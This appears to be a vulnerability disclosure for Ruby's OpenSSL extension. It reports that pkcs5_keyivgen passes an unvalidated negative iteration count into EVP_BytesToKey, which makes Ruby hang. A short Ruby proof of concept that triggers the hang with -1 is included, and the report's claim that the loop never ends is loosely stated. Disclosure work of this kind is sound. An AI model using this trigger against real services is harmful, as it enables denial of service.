Summary:

Integer Underflow @ ossl_cipher_pkcs5_keyivgen 
file : ext/openssl/ossl_cipher.c
affected parameter: iterations

INFO
Generates and sets the key/IV based on a password.
call-seq:
```
cipher.pkcs5_keyivgen(pass, salt = nil, iterations = 2048, digest = "MD5") -> nil
```


ANALYSIS
iter(int) in ossl_cipher_pkcs5_keyivgen  which holds iterations value is not validated before use.
therefore passed on to openssl library function EVP_BytesToKey which loops over
iter(iterations) using count
```
for (i = 1; i < (unsigned int)count; i++) {
  if (!EVP_DigestInit_ex(c, md, NULL))
  [code redacted]
]
```
if count aka iterations is negative this loop runs forever and therefore causing 
ruby to hang and eat up memory since allocation are performed during 
this loop and "i" can never be greater than count

POC
```
require 'digest'
require 'openssl'
require 'base64'

data = 'abc'
key = '1234567887654321'
iv = key[0..7]
cipher = OpenSSL::Cipher::Cipher.new('DES-EDE3-CBC') # or any other algorithm?

cipher.encrypt
cipher.pkcs5_keyivgen(key, iv, -1)
output = cipher.update(data)
output << cipher.final
```
